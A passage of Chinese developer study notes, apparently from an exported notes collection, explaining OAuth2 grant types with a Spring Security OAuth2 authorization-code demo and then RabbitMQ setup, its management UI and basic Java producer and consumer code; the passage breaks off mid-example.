角色\n**客户端**\n本身不存储资源，需要通过资源拥有者的授权去请求资源服务器的资源，比如：Android客户端、Web客户端（浏览器端）、微信客户端等。\n**资源拥有者**\n通常为用户，也可以是应用程序，即该资源的拥有者。\n**授权服务器（也称认证服务器）**\n用来对资源拥有的身份进行认证、对访问资源进行授权。客户端要想访问资源需要通过认证服务器由资源拥有者授权后方可访问。\n**资源服务器**\n存储资源的服务器，比如，网站用户管理服务器存储了网站用户信息，网站相册服务器存储了用户的相册信息，微倍的资源服务存储了微信的用户信息等。客户端最终访问资源服务器获取资源信息。\n\n### 常用话术\n- 客户凭证（client Credentials）：客户端的clientId和密码用于认证客户\n- 令牌（tokens）：授权服务器在接收到客户请求后，颁发的访问令牌\n- 作用域（scopes）：客户请求访问令牌时，由资源拥有者额外指定的细分权限（permission）\n\n### 令牌类型\n- 授权码：仅用于授权码授权类型，用于交换获取访问令牌和刷新令牌\n- 访问令牌：用于代表一个用户或服务直接去访问受保护的资源\n- 刷新令牌：用于去授权服务器获取一个刷新访问令牌\n- Bearer Token：不管谁拿到Token都可以访问资源，类似现金\n- Proof of Possession（Pop）Token：可以校验client是否对Token有明确的拥有权\n\n### Oauth2的特点\n**优点**\n- 更安全，客户端不接触用户密码，服务器端更易集中保护\n- 广泛传播并被持续采用\n- 短寿命和封装的token\n- 资源服务器和授权服务器解耦\n- 集中式授权，简化客户端\n- HTTP/JSON友好，易于请求和传递token\n- 考虑多种客户端架构场景\n- 客户可以具有不同的信任级别\n**缺点**\n- 协议框架太宽泛，造成各种实现的兼容性和互操作性差\n- 不是一个认证协议，本身并不能告诉你任何用户信息。\n\n### Oauth2的授权模式类型\nOAuth 引入了一个授权层，用来分离两种不同的角色：客户端和资源拥有者. 资源拥有者同意以后，资源服务器可以向客户端颁发令牌。客户端通过令牌，去请求数据。\n这段话的意思就是，OAuth 的核心就是向第三方应用颁发令牌。然后，RFC 6749 接着写道：\n（由于互联网有多种场景，）本标准定义了获得令牌的四种授权方式（authorization grant ）。\n也就是说，OAuth 2.0 规定了四种获得令牌的流程。你可以选择最适合自己的那一种，向第三方应用颁发令牌。下面就是这四种授权方式。\n- 授权码（authorization-code）\n- 隐藏式（implicit）\n- 密码式（password）：\n- 客户端凭证（client credentials）\n注意，不管哪一种授权方式，第三方应用申请令牌之前，都必须先到系统备案，说明自己的身份，然后会拿到两个身份识别码：客户端 ID（client ID）和客户端密钥（client secret）。这是为了防止令牌被滥用，没有备案过的第三方应用，是不会拿到令牌的。\n\n#### 授权码模式(Authorization Code)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161528.png)\n\n授权码（authorization code）方式，指的是第三方应用先申请一个授权码，然后再用该码获取令牌。\n这种方式是最常用的流程，安全性也最高，它适用于那些有后端的 Web 应用。授权码通过前端传送，令牌则是储存在后端，而且所有与资源服务器的通信都在后端完成。这样的前后端分离，可以避免令牌泄漏。\n\n第一步，A 网站提供一个链接，用户点击后就会跳转到 B 网站，授权用户数据给 A 网站使用。下面就是 A 网站跳转 B 网站的一个示意链接。\n`https://b.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=CALLBACK_URL&scope=read`\n上面 URL 中，response_type参数表示要求返回授权码（code），client_id参数让 B 知道是谁在请求，redirect_uri参数是 B 接受或拒绝请求后的跳转网址，scope参数表示要求的授权范围（这里是只读）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161543.png)\n\n第二步，用户跳转后，B 网站会要求用户登录，然后询问是否同意给予 A 网站授权。用户表示同意，这时 B 网站就会跳回redirect_uri参数指定的网址。跳转时，会传回一个授权码，就像下面这样。\n`https://a.com/callback?code=AUTHORIZATION_CODE`\n上面 URL 中，code参数就是授权码。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161553.png)\n\n第三步，A 网站拿到授权码以后，就可以在后端，向 B 网站请求令牌。\n`https://b.com/oauth/token?client_id=CLIENT_ID&client_secret=CLIENT_SECRET&grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=CALLBACK_URL`\n上面 URL 中，client_id参数和client_secret参数用来让 B 确认 A 的身份（client_secret参数是保密的，因此只能在后端发请求），grant_type参数的值是AUTHORIZATION_CODE，表示采用的授权方式是授权码，code参数是上一步拿到的授权码，redirect_uri参数是令牌颁发后的回调网址。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161602.png)\n\n\n第四步，B 网站收到请求以后，就会颁发令牌。具体做法是向redirect_uri指定的网址，发送一段 JSON 数据。\n```json\n{    \n  \"access_token\":\"ACCESS_TOKEN\",\n  \"token_type\":\"bearer\",\n  \"expires_in\":2592000,\n  \"refresh_token\":\"REFRESH_TOKEN\",\n  \"scope\":\"read\",\n  \"uid\":100101,\n  \"info\":{...}\n}\n```\n上面 JSON 数据中，access_token字段就是令牌，A 网站在后端拿到了。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161612.png)\n\n#### 隐藏式模式\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161622.png)\n\n有些 Web 应用是纯前端应用，没有后端。这时就不能用上面的方式了，必须将令牌储存在前端。RFC 6749 就规定了第二种方式，允许直接向前端颁发令牌。这种方式没有授权码这个中间步骤，所以称为（授权码）\"隐藏式\"（implicit）。\n\n第一步，A 网站提供一个链接，要求用户跳转到 B 网站，授权用户数据给 A 网站使用。\n`https://b.com/oauth/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=CALLBACK_URL&scope=read`\n上面 URL 中，response_type参数为token，表示要求直接返回令牌。\n\n第二步，用户跳转到 B 网站，登录后同意给予 A 网站授权。这时，B 网站就会跳回redirect_uri参数指定的跳转网址，并且把令牌作为 URL 参数，传给 A 网站。\n`https://a.com/callback#token=ACCESS_TOKEN`\n上面 URL 中，token参数就是令牌，A 网站因此直接在前端拿到令牌。\n\n注意，令牌的位置是 URL 锚点（fragment），而不是查询字符串（querystring），这是因为 OAuth 2.0 允许跳转网址是 HTTP 协议，因此存在\"中间人攻击\"的风险，而浏览器跳转时，锚点不会发到服务器，就减少了泄漏令牌的风险。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161634.png)\n\n这种方式把令牌直接传给前端，是很不安全的。因此，只能用于一些安全要求不高的场景，并且令牌的有效期必须非常短，通常就是会话期间（session）有效，浏览器关掉，令牌就失效了。\n\n\n#### 密码式\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161647.png)\n\n如果你高度信任某个应用，RFC 6749 也允许用户把用户名和密码，直接告诉该应用。该应用就使用你的密码，申请令牌，这种方式称为\"密码式\"（password）。\n\n第一步，A 网站要求用户提供 B 网站的用户名和密码。拿到以后，A 就直接向 B 请求令牌。\n`https://oauth.b.com/token?grant_type=password&username=USERNAME&password=PASSWORD&client_id=CLIENT_ID`\n上面 URL 中，grant_type参数是授权方式，这里的password表示\"密码式\"，username和password是 B 的用户名和密码。\n\n第二步，B 网站验证身份通过后，直接给出令牌。注意，这时不需要跳转，而是把令牌放在 JSON 数据里面，作为 HTTP 回应，A 因此拿到令牌。\n\n这种方式需要用户给出自己的用户名/密码，显然风险很大，因此只适用于其他授权方式都无法采用的情况，而且必须是用户高度信任的应用。\n\n#### 客户端凭证式\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161700.png)\n\n最后一种方式是凭证式（client credentials），适用于没有前端的命令行应用，即在命令行下请求令牌。\n\n第一步，A 应用在命令行向 B 发出请求。\n`https://oauth.b.com/token?grant_type=client_credentials&client_id=CLIENT_ID&client_secret=CLIENT_SECRET`\n上面 URL 中，grant_type参数等于client_credentials表示采用凭证式，client_id和client_secret用来让 B 确认 A 的身份。\n\n第二步，B 网站验证通过以后，直接返回令牌。\n\n这种方式给出的令牌，是针对第三方应用的，而不是针对用户的，即有可能多个用户共享同一个令牌。\n\n### Spring Security Oauth2\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161712.png)\n\n- Authorize Endpoint：授权端点，进行授权\n- Token Endpoint：令牌端点，进过授权拿到对应的Token \n- Introspection Endpoint：校验端点，校验Token的合法性\n- Revocation Endpoint：撤销端点，撤销授权\n\n### Spring Security Oauth2架构\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161730.png)\n\n1. 用户访问，此时没有Token。Oauth2RestTemplate会报错，这个报错信息会被Oauth2ClientContextFilter捕获并重定向到认证服务器\n2. 认证服务器通过Authorization Endpoint进行授权，并通过AuthorizationServerTokenServices生成授权码并返回给客户端\n3. 客户端拿到授权码去认证服务器通过Token Endpoint调用AuthorizationServerTokenServices生成Token并返回给客户端\n4. 客户端拿到Token去资源服务器访问资源，一般会通过Oauth2AuthenticationManager调用ResourceServerTokenServices进行校验。校验通过可以获取资源。\n\n### 实战spring security Oauth2实现授权码模式\n目录：\n- config\n  - <a href=\"#AuthorizationServerConfig\">AuthorizationServerConfig</a>\n  - <a href=\"#ResourceServerConfig\">ResourceServerConfig</a>\n  - <a href=\"#SecurityConfig2\">SecurityConfig</a>\n- controller\n  - <a href=\"#UserController2\">UserController</a>\n- service\n  - <a href=\"#UserService2\">UserService</a>\n\n**依赖**\n```xml\n<parent>\n\t<artifactId>spring-boot-dependencies</artifactId>\n\t<groupId>org.springframework.boot</groupId>\n\t<version>2.3.7.RELEASE</version>\n</parent>\n\n<properties>\n\t<java.version>11</java.version>\n\t<spring-cloud.version>Hoxton.SR8</spring-cloud.version>\n</properties>\n\n<dependencies>\n\t<dependency>\n\t\t\t<groupId>org.springframework.cloud</groupId>\n\t\t<artifactId>spring-cloud-starter-oauth2</artifactId>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>org.springframework.cloud</groupId>\n\t\t<artifactId>spring-cloud-starter-security</artifactId>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>org.springframework.boot</groupId>\n\t\t<artifactId>spring-boot-starter-web</artifactId>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>org.springframework.boot</groupId>\n\t\t<artifactId>spring-boot-starter-test</artifactId>\n\t</dependency>\n</dependencies>\n\n<dependencyManagement>\n\t<dependencies>\n\t\t<dependency>\n\t\t\t<groupId>org.springframework.cloud</groupId>\n\t\t\t<artifactId>spring-cloud-dependencies</artifactId>\n\t\t\t<version>${spring-cloud.version}</version>\n\t\t\t<type>pom</type>\n\t\t\t<scope>import</scope>\n\t\t</dependency>\n\t</dependencies>\n</dependencyManagement>\n```\n**<span id=\"SecurityConfig2\">SecurityConfig</span>**\n```java\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\t@Bean\n\tpublic PasswordEncoder passwordEncoder(){\n\t\treturn new BCryptPasswordEncoder();\n\t}\n\n\t@Override\n\tprotected void configure(HttpSecurity http) throws Exception {\n\t\thttp.csrf().disable()\n\t\t\t\t.authorizeRequests()\n\t\t\t\t.antMatchers(\"/oauth/**\", \"/login/**\",\"logout/**\").permitAll()\n\t\t\t\t.anyRequest().authenticated()\n\t\t\t\t.and()\n\t\t\t\t.formLogin()\n\t\t\t\t.permitAll();\n\t}\n}\n```\n**<span id=\"ResourceServerConfig\">ResourceServerConfig</span>**\n```java\n/**\n * 资源服务器的配置\n */\n@Configuration\n@EnableResourceServer\npublic class ResourceServerConfig extends ResourceServerConfigurerAdapter {\n\t@Override\n\tpublic void configure(HttpSecurity http) throws Exception {\n\t\thttp.authorizeRequests()\n\t\t\t.anyRequest().authenticated()\n\t\t\t.and()\n\t\t\t.requestMatchers()\n\t\t\t.antMatchers(\"/user/**\");\n\t}\n}\n```\n**<span id=\"AuthorizationServerConfig\">AuthorizationServerConfig</span>**\n```java\n/**\n * 授权服务器的配置\n */\n@Configuration\n@EnableAuthorizationServer\npublic class AuthorizationServerConfig extends AuthorizationServerConfigurerAdapter {\n\t@Autowired\n\tprivate PasswordEncoder passwordEncoder;\n\n\t@Override\n\tpublic void configure(ClientDetailsServiceConfigurer clients) throws Exception {\n\t\t/**\n\t\t * 经过如下设置后，获取授权码的url为：\n\t\t * http://localhost:8080/oauth/authorize?response_type=code&client_id=whz&redirect_url=http://www.baidu.com&scope=all\n\t\t */\n\t\tclients.inMemory()\n\t\t\t\t//配置client-id\n\t\t\t\t.withClient(\"whz\")\n\t\t\t\t//配置client-secret\n\t\t\t\t.secret(passwordEncoder.encode(\"123\"))\n\t\t\t\t//配置访问token的有效期\n\t\t\t\t.accessTokenValiditySeconds(3600)\n\t\t\t\t//配置redirct-uri, 用于授权成功后的跳转\n\t\t\t\t.redirectUris(\"http://www.baidu.com\")\n\t\t\t\t// 配置申请的权限范围\n\t\t\t\t.scopes(\"all\")\n\t\t\t\t// 配置授权类型为authorization_code类型\n\t\t\t\t.authorizedGrantTypes(\"authorization_code\");\n\t}\n}\n```\n**<span id=\"UserController2\">UserController</span>**\n```java\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\t//获取当前用户的信息\n\t@RequestMapping(\"/getCurrentUser\")\n\tpublic Object getCurrentUser(Authentication authenticaton){\n\t\treturn authenticaton.getPrincipal();\n\t}\n}\n```\n**<span id=\"UserService2\">UserService</span>**\n```java\n@Service\npublic class UserService implements UserDetailsService {\n\n\t@Autowired\n\tprivate PasswordEncoder pw;\n\n\t@Override\n\tpublic UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n\t\t//这一步是在模拟判断从前端传来的username是否存在于数据库中，如果不存在则抛出UsernameNotFoundException异常\n\t\tif(!\"admin\".equals(username))\t{\n\t\t\tthrow new UsernameNotFoundException(\"用户名不存在!\");\n\t\t}\n\n\t\t//模拟根据前端传来的username从数据库中获取到了其密码。\n\t\t//这里要用pw进行加密的原因：我们再前端密码输入框中输入123后，springsecurity会自动将其通过你设置的密码解析器进行加密。后续的认证过程的密码都是加密后的密码\n\t\tString password = pw.encode(\"123\");\n\n\t\t//这里的admin,normal是用户拥有的权限, 而ROLE_abc表示该用户属于abc角色。注: 该用户不是属于ROLE_abc角色，“ROLE_”前缀只是用来与权限名相区别开\n\t\t//权限名与角色名是严格区分大小写的\n\t\treturn new User(username, password, AuthorityUtils.commaSeparatedStringToAuthorityList(\"admin\"));\n\t}\n}\n```\n**Springsecurityoauth2Application**\n```java\n@SpringBootApplication\npublic class Springsecurityoauth2Application {\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(Springsecurityoauth2Application.class, args);\n\t}\n}\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161742.png)\n\n\n## 理解OAuth和JWT的区别\n- oauth2有client和scope的概念，jwt没有。如果只是拿来用于颁布token的话，二者没区别。常用的bearer算法oauth、jwt都可以用。应用场景不同而已\n- Spring Cloud 的权限框架就是用的jwt实现的oauth2 。二者没有必然联系\n- Token功能不一样，JWT的token是包含用户基本信息的，然后通过加密的方式生成的字符串，服务器端拿到这个token之后不需要再去查询用户基本信息，解析完token之后就能拿到。想想在微服务架构下，用户服务是一个单独的服务，但是其他服务大部分情况下也会需要用户信息，难道要每次用到都去取一次吗？ JWT非常适合微服务。\n- OAuth2用在使用第三方账号登录的情况(比如使用weibo, qq, github登录某个app)。OAuth2是一个相对复杂的协议, 有4种授权模式, 其中的access code模式在实现时可以使用jwt才生成code, 也可以不用. 它们之间没有必然的联系.\n- JWT是用在前后端分离, 需要简单的对后台API进行保护时使用.(前后端分离无session, 频繁传用户密码不安全)\n- JWT是一种认证协议 。JWT提供了一种用于**发布接入令牌（Access Token),**并对发布的签名接入令牌进行验证的方法。 令牌（Token）本身包含了一系列声明，应用程序可以根据这些声明限制用户对资源的访问。\n- OAuth2是一种授权框架。提供了一套详细的授权机制（指导）。用户或应用可以通过公开的或私有的设置，授权第三方应用访问特定资源。\n\n# RBAC\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161803.png)\n"
  },
  {
    "title": "./notes/back-end/RibbitMQ.md",
    "body": "# MQ引言\n`MQ`(Message Quene) :  翻译为 `消息队列`,通过典型的 `生产者`和`消费者`模型,生产者不断向消息队列中生产消息，消费者不断的从队列中获取消息。因为消息的生产和消费都是异步的，而且只关心消息的发送和接收，没有业务逻辑的侵入,轻松的实现系统间解耦。别名为 `消息中间件`\t通过利用高效可靠的消息传递机制进行平台无关的数据交流，并基于数据通信来进行分布式系统的集成。\n\n当今市面上有很多主流的消息中间件，如老牌的`ActiveMQ`、`RabbitMQ`，炙手可热的`Kafka`，阿里巴巴自主开发`RocketMQ`等。\n## 不同MQ特点\n**1. ActiveMQ**\nActiveMQ 是Apache出品，最流行的，能力强劲的开源消息总线。它是一个完全支持JMS规范的的消息中间件。丰富的API,多种集群架构模式让ActiveMQ在业界成为老牌的消息中间件,在中小型企业颇受欢迎!\n**2. Kafka**\nKafka是LinkedIn开源的分布式发布-订阅消息系统，目前归属于Apache顶级项目。Kafka主要特点是基于Pull的模式来处理消息消费，追求高吞吐量，一开始的目的就是用于日志收集和传输。0.8版本开始支持复制，不支持事务，对消息的重复、丢失、错误没有严格要求，适合产生大量数据的互联网服务的数据收集业务。\n**3. RocketMQ**\nRocketMQ是阿里开源的消息中间件，它是纯Java开发，具有高吞吐量、高可用性、适合大规模分布式系统应用的特点。RocketMQ思路起源于Kafka，但并不是Kafka的一个Copy，它对消息的可靠传输及事务性做了优化，目前在阿里集团被广泛应用于交易、充值、流计算、消息推送、日志流式处理、binglog分发等场景。\n**4. RabbitMQ**\nRabbitMQ是使用Erlang语言开发的开源消息队列系统，基于AMQP协议来实现。AMQP的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。AMQP协议更多用在企业系统内对数据一致性、稳定性和可靠性要求很高的场景，对性能和吞吐量的要求还在其次。\n\n> RabbitMQ比Kafka可靠，Kafka更适合IO高吞吐的处理，一般应用在大数据日志处理或对实时性（少量延迟），可靠性（少量丢数据）要求稍低的场景使用，比如ELK日志收集。\n\n# RabbitMQ 的引言\n\n> 基于`AMQP`协议，erlang语言开发，是部署最广泛的开源消息中间件,是最受欢迎的开源消息中间件之一。\n\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123216.png)\n\n`官网`: https://www.rabbitmq.com/\n`官方教程`: https://www.rabbitmq.com/#getstarted\n\n>\tAMQP（advanced message queuing protocol）`在2003年时被提出，最早用于解决金融领不同平台之间的消息传递交互问题。顾名思义，AMQP是一种协议，更准确的说是一种binary wire-level protocol（链接协议）。这是其和JMS的本质差别，AMQP不从API层进行限定，而是直接定义网络交换的数据格式。这使得实现了AMQP的provider天然性就是跨平台的。以下是AMQP协议模型:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123229.png)\n\n## RabbitMQ的安装配置\n**安装步骤**\n```shell\nsudo apt-get install erlang-nox\nsudo apt-get install rabbitmq-server\n```\n\n**RabbitMQ的配置文件**\n在/etc/rabbitmq/目录下有一个rabbitmq-env.conf配置文件，这个配置文件默认内容不是很全，我们可以在官网上下一个比较全的配置文件内容复制到这个文件里\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123238.png)\n\n**开启用户远程访问**\n默认情况下，RabbitMQ的默认的guest用户(密码默认为guest)只允许本机访问， 如果想让guest用户能够远程访问的话，只需要将配置文件中的loopback_users列表置为空即可，如下：\n```conf\n{loopback_users, []}\n```\n另外关于新添加的用户，直接就可以从远程访问的，如果想让新添加的用户只能本地访问，可以将用户名添加到上面的列表, 如只允许admin用户本机访问。\n```conf\n{loopback_users, [\"admin\"]}\n```\n\n**有关RabbitMQ服务启动、关闭**\n```shell\nservice rabbitmq-server start\nservice rabbitmq-server restart\nservice rabbitmq-server stop\n```\n\n**RabbitMQ的web管理工具**\nRabbitMQ 提供了一个 web 管理工具（rabbitmq_management），方便在浏览器端管理RabbitMQ，执行下面命令来启用这个web管理工具\n```shell\nrabbitmq-plugins enable rabbitmq_management\n```\n之后在浏览器访问`[http://server-ip:15672/]`, 就会出现如下界面\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123248.png)\n\n输入默认用户guest, 密码为guest后即可进入\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123259.png)\n\n**RabbitMQ管理命令行**\n管理命令行,  用来在不使用web管理界面情况下命令操作RabbitMQ\n```shell\nrabbitmqctl  help  可以查看更多命令\n```\n\n**插件管理命令行**\n```shell\nrabbitmq-plugins enable|list|disable \n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123308.png)\n\n# web管理界面介绍\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123316.png)\n\n- `connections`：无论生产者还是消费者，都需要与RabbitMQ建立连接后才可以完成消息的生产和消费，在这里可以查看连接情况\n- `channels`：通道，建立连接后，会形成通道，消息的投递获取依赖通道。\n- `Exchanges`：交换机，用来实现消息的路由\n- `Queues`：队列，即消息队列，消息存放在队列中，等待消费，消费后被移除队列。\n\n## 添加用户\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123326.png)\n\n上面的Tags选项，其实是指定用户的角色，可选的有以下几个：\n- `超级管理员(administrator)`：可登陆管理控制台，可查看所有的信息，并且可以对用户，策略(policy)进行操作。\n- `监控者(monitoring)`：可登陆管理控制台，同时可以查看rabbitmq节点的相关信息(进程数，内存使用情况，磁盘使用情况等)\n- `策略制定者(policymaker)`：可登陆管理控制台, 同时可以对policy进行管理。但无法查看节点的相关信息(上图红框标识的部分)。\n- `普通管理者(management)`：仅可登陆管理控制台，无法看到节点信息，也无法对策略进行管理。\n- `其他`：无法登陆管理控制台，通常就是普通的生产者和消费者。\n\n## 创建虚拟主机\n为了让各个用户可以互不干扰的工作，RabbitMQ添加了虚拟主机（Virtual Hosts）的概念。其实就是一个独立的访问路径，不同用户使用不同路径，各自有自己的队列、交换机，互相不会影响。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123405.png)\n\n## 绑定虚拟主机和用户\n创建好虚拟主机，我们还要给用户添加访问权限：\n点击添加好的虚拟主机：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123415.png)\n\n进入虚拟机设置界面:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123423.png)\n\n---\n\n# RabbitMQ的第一个程序\nAMQP协议的回顾\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123431.png)\n\nRabbitMQ支持的消息模型\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123440.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123454.png)\n\n## 引入依赖\n```xml\n<dependency>\n  <groupId>com.rabbitmq</groupId>\n  <artifactId>amqp-client</artifactId>\n  <version>5.7.2</version>\n</dependency>\n```\n\n## 第一种模型(直连)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123506.png)\n\n在上图的模型中，有以下概念：\n- P：生产者，也就是要发送消息的程序\n- C：消费者：消息的接受者，会一直等待消息到来。\n- queue：消息队列，图中红色部分。类似一个邮箱，可以缓存消息；生产者向其中投递消息，消费者从其中取出消息。\n\n### 开发生产者\n```java\n\tpublic void testSendMessage() throws IOException, TimeoutException {\n\t\t//创建连接mq的连接工厂对象\n\t\tConnectionFactory connectionFactory = new ConnectionFactory();\n\t\t//设置连接rabbitmq主机\n\t\tconnectionFactory.setHost(\"127.0.0.1\");\n\t\t//设置端口号\n\t\tconnectionFactory.setPort(5672);\n\t\t//设置连接那个虚拟主机\n\t\tconnectionFactory.setVirtualHost(\"/ems\");\n\t\t//设置访问虚拟主机的用户名与密码\n\t\tconnectionFactory.setUsername(\"ems\");\n\t\tconnectionFactory.setPassword(\"ems\");\n\n\t\t//获取连接对象\n\t\tConnection connection = connectionFactory.newConnection();\n\n\t\t//获取连接中通道\n\t\tChannel channel = connection.createChannel();\n\n\t\t//通道绑定对应消息队列\n\t\t//参数1：队列名称，如果队列不存在，则自动创建\n\t\t//参数2：用来定义队列特性是否要持久化，true表示持久化队列\n\t\t//参数3：是否独占队列，true表示独占队列\n\t\t//参数4：是否在消费完后自动删除队列，true表示自动删除\n\t\t//参数5：额外附加参数\n\t\tchannel.queueDeclare(\"hello\", false, false,false,null);\n\n\t\t//发布消息\n\t\t//参数1：交换机名称\n\t\t//参数2：队列名称\n\t\t//参数3：传递消息额外设置\n\t\t//参数4：消息具体内容\n\t\tchannel.basicPublish(\"\",\"hello\", null, \"hello rabbit\".getBytes());\n\t\t\n\t\tchannel.close();\n\t\tconnection.close();\n\t}\n```\n\n### 开发消费者\n```java\n\tpublic void test() throws IOException, TimeoutException {\n\t\t//创建连接工厂\n\t\tConnectionFactory connectionFactory = new ConnectionFactory();\n\t\tconnectionFactory.setHost(\"127.0.0.1\");\n\t\tconnectionFactory.setPort(5672);\n\t\tconnectionFactory.setVirtualHost(\"/ems\");\n\t\tconnectionFactory.setUsername(\"ems\");\n\t\tconnectionFactory.setPassword(\"ems\");\n\n\t\t//创建连接对象\n\t\tConnection connection = connectionFactory.newConnection();\n\n\t\t//创建连接中的通道\n\t\tChannel channel = connection.createChannel();\n\n\t\t//通道绑定对应消息队列\n\t\tchannel.queueDeclare(\"hello\", false, false, false, null);\n\n\t\t//消费消息\n\t\t//参数1：消费哪个队列的信息\n\t\t//参数2：是否开启消息的自动确认机制，如果开启了，则不是在回调接口函数执行完了才向队列发送确认\n\t\t//参数3：消费时的回调接口\n\t\tchannel.basicConsume(\"hello\", true, new DefaultConsumer(channel){\n\t\t\t@Override\n\t\t\t//最后一个参数：从消息队列中取出的信息\n\t\t\tpublic void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException{\n\t\t\t\tSystem.out.println(new String(body));\t\t\n\t\t\t}\n\t\t});\n\t}\n```\n\n## 第二种模型(work quene)\n`Work queues`，也被称为（`Task queues`），任务模型。当消息处理比较耗时的时候，可能生产消息的速度会远远大于消息的消费速度。长此以往，消息就会堆积越来越多，无法及时处理。此时就可以使用work 模型：**让多个消费者绑定到一个队列，共同消费队列中的消息**。队列中的消息一旦消费，就会消失，因此任务是不会被重复执行的。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123516.png)\n\n角色：\n- P：生产者：任务的发布者\n- C1：消费者-1，领取任务并且完成任务，假设完成速度较慢\n- C2：消费者-2：领取任务并完成任务，假设完成速度快\n\n### 开发生产者\n```java\n//创建连接工厂\nConnectionFactory connectionFactory = new ConnectionFactory();\nconnectionFactory.setHost(\"127.0.0.1\");\nconnectionFactory.setPort(5672);\nconnectionFactory.setVirtualHost(\"/ems\");\nconnectionFactory.setUsername(\"ems\");\nconnectionFactory.setPassword(\"ems\");\n\n//创建连接对象\nConnection connection = connectionFactory.newConnection();\n\n//创建连接中的通道\nChannel channel = connection.createChannel();\n\n\nchannel.queueDeclare(\"hello\", true, false, false, null);\nfor (int i = 0; i < 10; i++) {\n  channel.basicPublish(\"\", \"hello\", null, (i+\"====>:我是消息\").getBytes());\n}\n```\n\n### 开发消费者-1\n```java\n//创建连接工厂\nConnectionFactory connectionFactory = new ConnectionFactory();\nconnectionFactory.setHost(\"127.0.0.1\");\nconnectionFactory.setPort(5672);\nconnectionFactory.setVirtualHost(\"/ems\");\nconnectionFactory.setUsername(\"ems\");\nconnectionFactory.setPassword(\"ems\");\n\n//创建连接对象\nConnection connection = connectionFactory.newConnection();\n\n//创建连接中的通道\nChannel channel = connection.createChannel();\n\nchannel.queueDeclare(\"hello\",true,false,false,null);\nchannel.basicConsume(\"hello\",true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者1: \"+new String(body));\n  }\n});\n```\n\n### 开发消费者-2\n```java\n//创建连接工厂\nConnectionFactory connectionFactory = new ConnectionFactory();\nconnectionFactory.setHost(\"127.0.0.1\");\nconnectionFactory.setPort(5672);\nconnectionFactory.setVirtualHost(\"/ems\");\nconnectionFactory.setUsername(\"ems\");\nconnectionFactory.setPassword(\"ems\");\n\n//创建连接对象\nConnection connection = connectionFactory.newConnection();\n\n//创建连接中的通道\nChannel channel = connection.createChannel();\n\nchannel.queueDeclare(\"hello\",true,false,false,null);\nchannel.basicConsume(\"hello\",true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    try {\n      Thread.sleep(1000);   //处理消息比较慢 一秒处理一个消息\n    } catch (InterruptedException e) {\n      e.printStackTrace();\n    }\n    System.out.println(\"消费者2: \"+new String(body));  \n  }\n});\n```\n\n### 测试结果\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123528.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123539.png)\n\n> 总结:默认情况下，RabbitMQ将按顺序将每个消息发送给下一个使用者。并且每个消费者开启了自动确认机制，导致平均而言，每个消费者都会收到相同数量的消息。这种分发消息的方式称为循环。\n\n### 自动确认机制与多劳得到实现\n```java\n\nchannel.basicConsume(\"hello\", true, new DefaultConsumer(channel){...})\n```\n参数2：是否开启消息的自动确认机制，如果开启了，则不是在回调接口函数执行完了才向队列发送确认。\n开启了自动确认机制会导致，下面不好现象发生：\n当消费者接从消息队列中获取了5条信息， 由于每条信息都自动回复了确认，所以消息队列中会删除这5条信息，但是由于是自动回复的，所以消费者并没有把这5条信息都处理完，当处理到第3条信息时，突然出现问题，导致当前消费者退出，那么剩下的2条信息就不能处理，从而会被丢失。\n\n为了避免这种现象的产生，我们应该关闭自动确认机制，且消费者一次只能接受一条未确认的信息\n```java\n//设置一次只接受一条未确认的消息\nchannel.basicQos(1);\n\n//参数2:关闭自动确认消息\nchannel.basicConsume(\"hello\",false,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者1: \"+new String(body));\n\n    